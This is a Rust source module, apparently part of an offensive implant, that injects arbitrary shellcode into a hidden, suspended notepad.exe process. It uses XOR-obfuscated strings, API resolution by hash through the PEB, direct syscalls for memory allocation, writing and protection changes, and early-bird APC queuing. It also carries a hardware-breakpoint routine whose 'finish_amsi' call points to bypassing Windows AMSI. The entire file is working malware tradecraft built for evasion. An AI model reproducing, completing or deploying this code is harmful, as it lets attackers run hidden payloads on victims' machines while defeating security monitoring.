// Suspended spawn + shellcode inject + APC dispatch.
// no_std rewrite — &'static str errors, io::sleep for the race-escape.

#![allow(dead_code, non_camel_case_types)]

use core::mem;
use core::ptr;

use crate::{encoded_strings, hashes, io, native, obfuscation, peb, syscalls};
use native::{HANDLE, PVOID, PROCESS_INFORMATION, STARTUPINFOA};

// kernel32 fn pointer types — resolved by hash each call.

pub type CreateProcessAFn = unsafe extern "system" fn(
    lp_application_name: *const u8,
    lp_command_line: *mut u8,
    lp_process_attributes: PVOID,
    lp_thread_attributes: PVOID,
    b_inherit_handles: i32,
    dw_creation_flags: u32,
    lp_environment: PVOID,
    lp_current_directory: *const u8,
    lp_startup_info: *mut STARTUPINFOA,
    lp_process_information: *mut PROCESS_INFORMATION,
) -> i32;

pub type ResumeThreadFn        = unsafe extern "system" fn(HANDLE) -> u32;
pub type WaitForSingleObjectFn = unsafe extern "system" fn(HANDLE, u32) -> u32;
pub type CloseHandleFn         = unsafe extern "system" fn(HANDLE) -> i32;

pub struct InjectResult {
    pub pid: u32,
}

pub unsafe fn inject_shellcode(shellcode: &[u8]) -> Result<InjectResult, &'static str> {
    if shellcode.is_empty() {
        return Err("shellcode empty");
    }

    // 1. Decode target name "notepad.exe" onto a transient Vec<u8> (NUL-terminated).
    let mut target = obfuscation::xor_dec_mb(
        &encoded_strings::ENC_NOTEPAD_A,
        &encoded_strings::KEY_NOTEPAD_A,
    );

    // 2. Resolve kernel32 APIs by hash.
    let create_proc: CreateProcessAFn = mem::transmute(
        peb::resolve_by_hash(hashes::CREATE_PROCESS_A)?,
    );
    let resume_thr: ResumeThreadFn = mem::transmute(
        peb::resolve_by_hash(hashes::RESUME_THREAD)?,
    );
    let wait_obj: WaitForSingleObjectFn = mem::transmute(
        peb::resolve_by_hash(hashes::WAIT_FOR_SINGLE_OBJECT)?,
    );
    let close_h: CloseHandleFn = mem::transmute(
        peb::resolve_by_hash(hashes::CLOSE_HANDLE)?,
    );

    // 3. STARTUPINFOA.
    let mut si: STARTUPINFOA = mem::zeroed();
    si.cb          = mem::size_of::<STARTUPINFOA>() as u32;
    si.dwFlags     = native::STARTF_USESHOWWINDOW;
    si.wShowWindow = native::SW_HIDE;

    let mut pi: PROCESS_INFORMATION = mem::zeroed();

    let flags = native::CREATE_SUSPENDED | native::DETACHED_PROCESS | native::CREATE_NO_WINDOW;

    // 4. CreateProcessA.
    let ok = create_proc(
        ptr::null(),
        target.as_mut_ptr(),
        ptr::null_mut(), ptr::null_mut(),
        0,
        flags,
        ptr::null_mut(), ptr::null(),
        &mut si as *mut _,
        &mut pi as *mut _,
    );
    obfuscation::secure_zero_u8(&mut target);

    if ok == 0 || pi.hProcess.is_null() || pi.hThread.is_null() {
        return Err("CreateProcessA failed");
    }

    let result = inject_inner(&pi, shellcode, resume_thr, wait_obj);

    // Always close handles.
    if !pi.hThread.is_null()  { close_h(pi.hThread);  }
    if !pi.hProcess.is_null() { close_h(pi.hProcess); }

    result.map(|_| InjectResult { pid: pi.dwProcessId })
}

unsafe fn inject_inner(
    pi: &PROCESS_INFORMATION,
    shellcode: &[u8],
    resume_thr: ResumeThreadFn,
    wait_obj: WaitForSingleObjectFn,
) -> Result<(), &'static str> {
    // 5. Alloc RW in remote.
    let mut base: PVOID = ptr::null_mut();
    let mut size: usize = shellcode.len();
    let rc = syscalls::vm_alloc(
        pi.hProcess, &mut base, 0, &mut size,
        native::MEM_COMMIT | native::MEM_RESERVE,
        native::PAGE_READWRITE,
    );
    if !native::nt_success(rc) || base.is_null() {
        return Err("vm_alloc failed");
    }

    // 6. Write shellcode.
    let mut written: usize = 0;
    let rc = syscalls::vm_write(
        pi.hProcess, base, shellcode.as_ptr(), shellcode.len(), &mut written,
    );
    if !native::nt_success(rc) || written != shellcode.len() {
        return Err("vm_write failed");
    }

    // 7. Flip to RX.
    let mut prot_size: usize = shellcode.len();
    let mut old_prot: u32 = 0;
    let rc = syscalls::vm_protect(
        pi.hProcess, &mut base, &mut prot_size,
        native::PAGE_EXECUTE_READ, &mut old_prot,
    );
    if !native::nt_success(rc) {
        return Err("vm_protect failed");
    }

    // 8. Install remote HWBP blob.
    let rhwbp = crate::remote_hwbp::install(pi.hProcess, pi.hThread);
    let (bootstrap, blob_base) = match rhwbp {
        Ok(v) => (Some(v.0), Some(v.1)),
        Err(_) => (None, None),
    };

    // 9. Queue bootstrap APC (first) + shellcode APC (second).
    if let Some(entry) = bootstrap {
        let rc = syscalls::apc_queue(pi.hThread, entry,
                                      ptr::null_mut(), ptr::null_mut(), ptr::null_mut());
        if !native::nt_success(rc) {
            return Err("bootstrap-apc queue failed");
        }
    }
    let rc = syscalls::apc_queue(
        pi.hThread, base, ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
    );
    if !native::nt_success(rc) {
        return Err("shellcode-apc queue failed");
    }

    // 10. Resume — bootstrap APC fires first, then shellcode APC.
    let prev = resume_thr(pi.hThread);
    if prev == 0xFFFFFFFF {
        return Err("ResumeThread failed");
    }

    // 11. Race-escape Sleep(1000), then third-APC rearm. Load-bearing: the
    //     1000 ms window lets the host's remote blob land before the rearm
    //     syscalls retouch its DR state. Never shrink.
    if let Some(bb) = blob_base {
        io::sleep(1000);
        let _ = crate::remote_hwbp::finish_amsi(pi.hProcess, pi.hThread, bb);
    }

    // 12. Wait briefly for the chain to settle.
    wait_obj(pi.hThread, 5000);

    Ok(())
}
